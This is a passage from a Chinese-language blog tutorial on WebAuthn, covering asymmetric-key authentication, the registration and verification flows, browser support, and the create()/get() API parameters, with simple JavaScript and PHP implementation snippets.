的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 